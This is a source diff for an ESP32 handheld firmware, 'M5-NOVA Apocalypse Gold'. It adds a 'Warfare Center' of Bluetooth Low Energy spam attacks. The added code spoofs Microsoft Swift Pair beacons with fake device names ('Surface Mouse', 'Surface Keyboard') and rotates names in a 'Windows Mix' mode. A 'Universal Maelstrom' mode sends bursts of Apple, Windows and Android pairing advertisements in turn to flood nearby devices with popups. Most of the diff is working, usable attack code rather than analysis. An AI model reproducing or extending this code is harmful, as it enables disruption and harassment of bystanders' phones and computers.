@@ -25,8 +25,10 @@ uint16_t BGCOLOR=0x0000; // Cyan/Dark Theme Default: Black
 uint16_t FGCOLOR=0x07FF; // Cyan/Dark Theme Default: Cyan
 
 #ifndef NOVA_VERSION
-  #define NOVA_VERSION "1.1.0"
+  #define NOVA_VERSION "1.2.6 Apocalypse Gold" 
 #endif
+
+#define AUTHOR "Antigravity & RedRiveRR"
 
 #include <vector>
 
@@ -140,6 +142,20 @@ void af_samsung_setup();
 void af_samsung_loop();
 void af_pixel_setup();
 void af_pixel_loop();
+void winmenu_setup();
+void winmenu_loop();
+void wf_flood_setup();
+void wf_flood_loop();
+void wf_mix_setup();
+void wf_mix_loop();
+void wf_mouse_setup();
+void wf_mouse_loop();
+void wf_kb_setup();
+void wf_kb_loop();
+void wf_ctr_setup();
+void wf_ctr_loop();
+void maelstrom_setup();
+void maelstrom_loop();
 void getSSID();
 void setupWiFi();
 void setupWebServer();
@@ -393,12 +409,16 @@ int ph_alert_ssids = 5;
 bool rstOverride = false;   // Reset Button Override. Set to true when navigating menus.
 bool sourApple = false;     // Internal flag to place AppleJuice into SourApple iOS17 Exploit Mode
 bool swiftPair = false;     // Internal flag to place AppleJuice into Swift Pair random packet Mode
+const char* windowsNameOverride = nullptr; // Null for random, otherwise fixed name
 bool androidPair = false;   // Internal flag to place AppleJuice into Android Pair random packet Mode
 int androidModelOverride = -1; // -1 for random, otherwise specific index
 bool maelstrom = false;     // Internal flag to place AppleJuice into Bluetooth Maelstrom mode
 bool portal_active = false; // Internal flag used to ensure NOVA Portal exits cleanly
 bool activeQR = false; 
 const uint16_t PortalTickTimer = 1000;
+long m_apple_cnt = 0;
+long m_andro_cnt = 0;
+long m_win_cnt = 0;
 String apSsidName = String("");
 bool isSwitching = true;
 
@@ -670,7 +690,6 @@ int iosmenu_size = sizeof(iosmenu) / sizeof(MENU);
 void iosmenu_setup() {
   cursor = 0;
   rstOverride = true;
-  // Update names from localization
   iosmenu[0].name = TXT_BACK;
   iosmenu[1].name = TXT_PN_AT_PH;
   iosmenu[2].name = TXT_PN_HK_SG;
@@ -678,6 +697,14 @@ void iosmenu_setup() {
   iosmenu[4].name = TXT_OPT_MIX;
   iosmenu[5].name = TXT_OPT_NUCLEAR;
   iosmenu[6].name = TXT_OPT_SNIPER;
+  
+  DISP.fillScreen(BGCOLOR);
+  DISP.setCursor(0, 0);
+  DISP.setTextColor(RED, BGCOLOR);
+  DISP.println(" iOS Warfare Suite");
+  DISP.setTextColor(FGCOLOR, BGCOLOR);
+  DISP.println(" Select tactical mode:");
+  delay(1000);
   menuController.setup(iosmenu, iosmenu_size);
 }
 
@@ -703,10 +730,86 @@ void androidmenu_setup() {
   androidmenu[2].name = TXT_PN_AND_MIX;
   androidmenu[3].name = TXT_PN_SAMSUNG;
   androidmenu[4].name = TXT_PN_PIXEL;
+  
+  DISP.fillScreen(BGCOLOR);
+  DISP.setCursor(0, 0);
+  DISP.setTextColor(RED, BGCOLOR);
+  DISP.println(" Android Warfare Suite");
+  DISP.setTextColor(FGCOLOR, BGCOLOR);
+  DISP.println(" Select tactical mode:");
+  delay(1000);
   menuController.setup(androidmenu, androidmenu_size);
 }
 
 void androidmenu_loop() {
+  menuController.loop();
+}
+
+/// Windows Warfare MENU ///
+MENU winmenu[] = {
+  { "Back", 1},
+  { "Swift Pair Flood", 62},
+  { "Windows Mix", 63},
+  { "Surface Mouse", 64},
+  { "Surface Keyboard", 65},
+};
+int winmenu_size = sizeof(winmenu) / sizeof(MENU);
+
+void winmenu_setup() {
+  cursor = 0;
+  rstOverride = true;
+  winmenu[0].name = TXT_BACK;
+  winmenu[1].name = TXT_PN_SP_FL;
+  winmenu[2].name = TXT_PN_WIN_MIX;
+  winmenu[3].name = TXT_PN_W_MOUSE;
+  winmenu[4].name = TXT_PN_W_KEYBOARD;
+  
+  DISP.fillScreen(BGCOLOR);
+  DISP.setCursor(0, 0);
+  DISP.setTextColor(RED, BGCOLOR);
+  DISP.println(" Windows Warfare Suite");
+  DISP.setTextColor(FGCOLOR, BGCOLOR);
+  DISP.println(" Select tactical mode:");
+  delay(1000);
+  menuController.setup(winmenu, winmenu_size);
+}
+
+void winmenu_loop() {
+  menuController.loop();
+}
+
+/// WARFARE CENTER MENU ///
+MENU wfctrmenu[] = {
+  { "Back", 1},
+  { "iOS Warfare", 41},
+  { "Android Warfare", 51},
+  { "Windows Warfare", 61},
+  { "UNIVERSAL MAELSTROM", 72},
+};
+int wfctrmenu_size = sizeof(wfctrmenu) / sizeof(MENU);
+
+void wf_ctr_setup() {
+  cursor = 0;
+  rstOverride = true;
+  wfctrmenu[0].name = TXT_BACK;
+  wfctrmenu[1].name = TXT_MN_IOS;
+  wfctrmenu[2].name = TXT_MN_AND;
+  wfctrmenu[3].name = TXT_MN_WIN;
+  wfctrmenu[4].name = TXT_MN_MAE;
+  
+  DISP.fillScreen(BLACK);
+  DISP.setCursor(0, 0);
+  DISP.setTextColor(MAGENTA, BLACK);
+  DISP.setTextSize(MEDIUM_TEXT);
+  DISP.println(" WARFARE CENTER ");
+  DISP.setTextColor(FGCOLOR, BLACK);
+  DISP.setTextSize(SMALL_TEXT);
+  DISP.println(" Initializing suites...");
+  delay(800);
+  menuController.setup(wfctrmenu, wfctrmenu_size);
+}
+
+void wf_ctr_loop() {
   menuController.loop();
 }
 
@@ -722,7 +825,7 @@ MENU mmenu[] = {
   { "", 27},
 #endif
   { "", 18},
-  { "", 41}, // iOS Warfare
+  { "", 71}, // Warfare Center
   { "", 2},
 };
 int mmenu_size = sizeof(mmenu) / sizeof(MENU);
@@ -1958,36 +2061,28 @@ void aj_adv(){
       packet[i++] =  0x10;  // Type ???
       esp_fill_random(&packet[i], 3);
       oAdvertisementData.addData(std::string((char *)packet, 17));
-      for (int i = 0; i < sizeof packet; i ++) {
-        Serial.printf("%02x", packet[i]);
-      }
-      Serial.println("");
     } else if (swiftPair) {
-      const char* display_name = generateRandomName();
+      oAdvertisementData.setFlags(0x06); // General Discoverable Mode & BR/EDR Not Supported
+      const char* display_name = (windowsNameOverride == nullptr) ? generateRandomName() : windowsNameOverride;
       Serial.printf(TXT_SP_ADV, display_name);
-      uint8_t display_name_len = strlen(display_name);
-      uint8_t size = 7 + display_name_len;
-      uint8_t* packet = (uint8_t*)malloc(size);
-      uint8_t i = 0;
-      packet[i++] = size - 1; // Size
-      packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
-      packet[i++] = 0x06; // Company ID (Microsoft)
-      packet[i++] = 0x00; // ...
-      packet[i++] = 0x03; // Microsoft Beacon ID
-      packet[i++] = 0x00; // Microsoft Beacon Sub Scenario
-      packet[i++] = 0x80; // Reserved RSSI Byte
+      uint8_t display_name_len = (strlen(display_name) > 19) ? 19 : strlen(display_name); // Safety Truncate
+      uint8_t w_size = 7 + display_name_len;
+      uint8_t* w_packet = (uint8_t*)malloc(w_size);
+      uint8_t wi = 0;
+      w_packet[wi++] = w_size - 1; // Size
+      w_packet[wi++] = 0xFF; // AD Type (Manufacturer Specific)
+      w_packet[wi++] = 0x06; // Company ID (Microsoft)
+      w_packet[wi++] = 0x00; // ...
+      w_packet[wi++] = 0x03; // Microsoft Beacon ID
+      w_packet[wi++] = 0x00; // Microsoft Beacon Sub Scenario
+      w_packet[wi++] = 0x80; // Reserved RSSI Byte
       for (int j = 0; j < display_name_len; j++) {
-        packet[i + j] = display_name[j];
+        w_packet[wi + j] = display_name[j];
       }
-      for (int i = 0; i < size; i ++) {
-        Serial.printf("%02x", packet[i]);
-      }
-      Serial.println("");
-
-      i += display_name_len;  
-      oAdvertisementData.addData(std::string((char *)packet, size));
-      free(packet);
-      free((void*)display_name);
+      wi += display_name_len;  
+      oAdvertisementData.addData(std::string((char *)w_packet, w_size));
+      free(w_packet);
+      if (windowsNameOverride == nullptr) free((void*)display_name);
     } else if (androidPair) {
       Serial.print(TXT_AD_SPAM_ADV);
       uint8_t packet[14];
@@ -2009,8 +2104,6 @@ void aj_adv(){
       packet[i++] = (rand() % 120) - 100; // -100 to +20 dBm
 
       oAdvertisementData.addData(std::string((char *)packet, 14));
-      pAdvertising->setAdvertisementData(oAdvertisementData);
-      pAdvertising->start();
     } else {
       // AppleJuice individual device mode
       // Build a proper AD structure: [LEN][0xFF][4C 00][protocol data]
@@ -2063,14 +2156,22 @@ void aj_adv(){
 #endif
   }
   if (check_next_press()) {
-    if (sourApple || swiftPair || androidPair || maelstrom){
+    if (current_proc >= 62 && current_proc <= 65) { // Windows Warfare Modules
       isSwitching = true;
-      current_proc = 16;
-      drawmenu(btmenu, btmenu_size);
-    } else if (current_proc >= 42 && current_proc <= 45) { // iOS Warfare Modules
+      current_proc = 61;
+      drawmenu(winmenu, winmenu_size);
+    } else if (current_proc >= 52 && current_proc <= 55) { // Android Warfare Modules
+      isSwitching = true;
+      current_proc = 51;
+      drawmenu(androidmenu, androidmenu_size);
+    } else if (current_proc >= 42 && current_proc <= 47) { // iOS Warfare Modules
       isSwitching = true;
       current_proc = 41;
       drawmenu(iosmenu, iosmenu_size);
+    } else if (sourApple || swiftPair || androidPair || maelstrom){
+      isSwitching = true;
+      current_proc = 16;
+      drawmenu(btmenu, btmenu_size);
     } else {
       isSwitching = true;
       current_proc = 8;      
@@ -2086,19 +2187,24 @@ void aj_adv(){
 
 /// CREDITS ///
 void credits_setup(){
-  DISP.fillScreen(BGCOLOR);
-  DISP.qrcode("https://github.com/RedRiveRR/Project", 145, 22, 100, 5);
-  DISP.setTextColor(FGCOLOR, BGCOLOR);
+  DISP.fillScreen(BLACK);
+  DISP.setTextColor(MAGENTA, BLACK);
   DISP.setTextSize(MEDIUM_TEXT);
-  DISP.setCursor(0, 10);
-  DISP.println(" NOVA Firmware ");
+  DISP.setCursor(5, 5);
+  DISP.println("NOVA APOCALYPSE");
   DISP.setTextSize(SMALL_TEXT);
-  DISP.printf("   v%s\n", NOVA_VERSION);
-  DISP.printf("   %s\n", platformName);
-  DISP.println("\n Developed by:");
-  DISP.setCursor(155, 5);
-  DISP.println(" GitHub ");
-  delay(250);
+  DISP.setTextColor(WHITE, BLACK);
+  DISP.printf("v%s\n", NOVA_VERSION);
+  DISP.println("--------------------");
+  DISP.setTextColor(FGCOLOR, BLACK);
+  DISP.println("Tactical Suite:");
+  DISP.println("- Warfare Center v1.2");
+  DISP.println("- Maelstrom v2.0 Burst");
+  DISP.println("- BadUSB Hunter Pro");
+  DISP.println("\nDeveloped by:");
+  DISP.setTextColor(RED, BLACK);
+  DISP.println(AUTHOR);
+  delay(3000); // Give user time to read
   cursor = 0;
   advtime = 0;
 }
@@ -2447,14 +2553,20 @@ void bootScreen(){
   setupSongs();
   #endif
   BITMAP;
-  delay(3000);
-  DISP.fillScreen(BGCOLOR);
-  DISP.setTextSize(BIG_TEXT);
-  DISP.setCursor(40, 0);
-  DISP.println("M5-NOVA");
-  DISP.setCursor(10, 30);
+  DISP.setTextColor(WHITE, BLACK);
   DISP.setTextSize(SMALL_TEXT);
-  DISP.printf("%s-%s\n",NOVA_VERSION,platformName);
+  DISP.setCursor(5, 120);
+  DISP.println(" v1.2.6 Apocalypse Gold ");
+  delay(3000);
+  DISP.fillScreen(BLACK);
+  DISP.setTextSize(BIG_TEXT);
+  DISP.setCursor(30, 0);
+  DISP.println("M5-NOVA");
+  DISP.setCursor(10, 40);
+  DISP.setTextSize(SMALL_TEXT);
+  DISP.setTextColor(CYAN, BLACK);
+  DISP.printf("System: %s\n", NOVA_VERSION);
+  DISP.printf("Target: %s\n", platformName);
 #if defined(CARDPUTER)
   DISP.println(TXT_INST_NXT);
   DISP.println(TXT_INST_PRV);
@@ -2733,6 +2845,13 @@ ProcessHandler processes[] = {
   {53, af_mix_setup, af_mix_loop, "Android Mix"},
   {54, af_samsung_setup, af_samsung_loop, "Samsung Siege"},
   {55, af_pixel_setup, af_pixel_loop, "Pixel Buds Siege"},
+  {61, winmenu_setup, winmenu_loop, "Windows Warfare Menu"},
+  {62, wf_flood_setup, wf_flood_loop, "Swift Pair Flood"},
+  {63, wf_mix_setup, wf_mix_loop, "Windows Mix"},
+  {64, wf_mouse_setup, wf_mouse_loop, "Surface Mouse Siege"},
+  {65, wf_kb_setup, wf_kb_loop, "Surface KB Siege"},
+  {71, wf_ctr_setup, wf_ctr_loop, "Warfare Center Menu"},
+  {72, maelstrom_setup, maelstrom_loop, "Universal Maelstrom"},
 #if defined(SDCARD) && !defined(CARDPUTER)
   {97, nullptr, ToggleSDCard, "SD Card"},
 #endif
@@ -2751,9 +2870,8 @@ void rebuildMenus() {
   #if defined(CARDPUTER)
     mmenu[i++].name = TXT_MN_USB;
   #endif
-  mmenu[i++].name = TXT_MN_USB;
-  mmenu[i++].name = TXT_MN_IOS;
-  mmenu[i++].name = TXT_MN_AND;
+  mmenu[i++].name = TXT_MN_QR;
+  mmenu[i++].name = TXT_MN_WF_CTR;
   mmenu[i++].name = TXT_SETTINGS;
 
   // Settings Menu labels
@@ -4602,4 +4720,182 @@ void af_pixel_setup() {
 
 void af_pixel_loop() {
   af_flood_loop();
+}
+
+// Implementation of Windows sub-modules (v1.1.2)
+void wf_flood_setup() {
+  pAdvertising->stop();
+  delay(100);
+  swiftPair = true;
+  windowsNameOverride = nullptr; // Random names
+  DISP.fillScreen(BGCOLOR);
+  DISP.setCursor(0, 0);
+  DISP.setTextColor(RED, BGCOLOR);
+  DISP.println(" Swift Pair Flood");
+  DISP.setTextColor(FGCOLOR, BGCOLOR);
+  DISP.println("Sending popups...");
+  DISP.println(TXT_SEL_EXIT2);
+}
+
+void wf_flood_loop() {
+  swiftPair = true;
+  aj_adv();
+  if (check_next_press()) {
+    pAdvertising->stop();
+    swiftPair = false;
+    current_proc = 61;
+    isSwitching = true;
+    delay(250);
+  }
+}
+
+void wf_mix_setup() {
+  pAdvertising->stop();
+  delay(100);
+  swiftPair = true;
+  windowsNameOverride = nullptr; 
+  DISP.fillScreen(BGCOLOR);
+  DISP.setCursor(0, 0);
+  DISP.setTextColor(RED, BGCOLOR);
+  DISP.println(" Windows Mix Mode");
+  DISP.setTextColor(FGCOLOR, BGCOLOR);
+  DISP.println("Rotating models...");
+  DISP.println(TXT_SEL_EXIT2);
+}
+
+void wf_mix_loop() {
+  swiftPair = true;
+  // Rotate name every few packets
+  static int mixIdx = 0;
+  static long lastMixChange = 0;
+  if (millis() - lastMixChange > 500) {
+    mixIdx = (mixIdx + 1) % windows_models_count;
+    windowsNameOverride = windows_models[mixIdx];
+    lastMixChange = millis();
+  }
+  aj_adv();
+  if (check_next_press()) {
+    pAdvertising->stop();
+    swiftPair = false;
+    current_proc = 61;
+    isSwitching = true;
+    delay(250);
+  }
+}
+
+void wf_mouse_setup() {
+  pAdvertising->stop();
+  delay(100);
+  swiftPair = true;
+  windowsNameOverride = "Surface Mouse";
+  DISP.fillScreen(BGCOLOR);
+  DISP.setCursor(0, 0);
+  DISP.setTextColor(RED, BGCOLOR);
+  DISP.println(" Surface Mouse");
+  DISP.setTextColor(FGCOLOR, BGCOLOR);
+  DISP.println("Sending popups...");
+  DISP.println(TXT_SEL_EXIT2);
+}
+
+void wf_mouse_loop() {
+  wf_flood_loop();
+}
+
+void wf_kb_setup() {
+  pAdvertising->stop();
+  delay(100);
+  swiftPair = true;
+  windowsNameOverride = "Surface Keyboard";
+  DISP.fillScreen(BGCOLOR);
+  DISP.setCursor(0, 0);
+  DISP.setTextColor(RED, BGCOLOR);
+  DISP.println(" Surface KB");
+  DISP.setTextColor(FGCOLOR, BGCOLOR);
+  DISP.println("Sending popups...");
+  DISP.println(TXT_SEL_EXIT2);
+}
+
+void wf_kb_loop() {
+  wf_flood_loop();
+}
+
+// Universal Maelstrom (Chaos Mode)
+void maelstrom_setup() {
+  m_apple_cnt = 0;
+  m_andro_cnt = 0;
+  m_win_cnt = 0;
+  pAdvertising->stop();
+  delay(100);
+  DISP.fillScreen(BLACK);
+  
+  // Static UI setup - Better Spacing
+  DISP.setTextColor(FGCOLOR, BLACK);
+  DISP.setTextSize(MEDIUM_TEXT);
+  DISP.setCursor(5, 5);
+  DISP.println("MAELSTROM v2");
+  
+  DISP.setTextSize(SMALL_TEXT);
+  DISP.setTextColor(RED, BLACK);
+  DISP.setCursor(5, 30);
+  DISP.println("MODE: apocalypse");
+  
+  // Progress bar background
+  DISP.drawRect(5, 45, 125, 12, WHITE);
+}
+
+void maelstrom_loop() {
+  maelstrom = true;
+  
+  // BURST MODE: 3x Apple (Force re-randomize each)
+  sourApple = true; swiftPair = false; androidPair = false;
+  for(int i=0; i<3; i++) { 
+    aj_adv(); 
+    m_apple_cnt++; 
+  }
+  
+  // BURST MODE: 3x Windows (Force null override to ensure name rotation)
+  sourApple = false; swiftPair = true; androidPair = false;
+  windowsNameOverride = nullptr;
+  for(int i=0; i<3; i++) { 
+    aj_adv(); 
+    m_win_cnt++; 
+  }
+
+  // BURST MODE: 3x Android (Force -1 to ensure model rotation)
+  sourApple = false; swiftPair = false; androidPair = true;
+  androidModelOverride = -1;
+  for(int i=0; i<3; i++) { 
+    aj_adv(); 
+    m_andro_cnt++; 
+  }
+
+  // UI Update (Chaos Dynamic)
+  if (millis() % 400 < 50) { 
+    DISP.fillRect(7, 47, 121, 8, RED); // Dynamic Flicker
+  } else {
+    DISP.fillRect(7, 47, 121, 8, BLACK);
+  }
+  
+  DISP.setTextColor(WHITE, BLACK);
+  DISP.setCursor(5, 65);
+  DISP.printf("Apple   : %-8ld", m_apple_cnt);
+  DISP.setCursor(5, 80);
+  DISP.printf("Android : %-8ld", m_andro_cnt);
+  DISP.setCursor(5, 95);
+  DISP.printf("Windows : %-8ld", m_win_cnt);
+  
+  DISP.setCursor(5, 120);
+  DISP.setTextColor(RED, BLACK);
+  DISP.print("  [SIDE BUTTON] STOP  ");
+
+  if (check_next_press()) {
+    pAdvertising->stop();
+    maelstrom = false;
+    sourApple = false;
+    androidPair = false;
+    swiftPair = false;
+    current_proc = 71; 
+    isSwitching = true;
+    delay(250);
+  }
 }
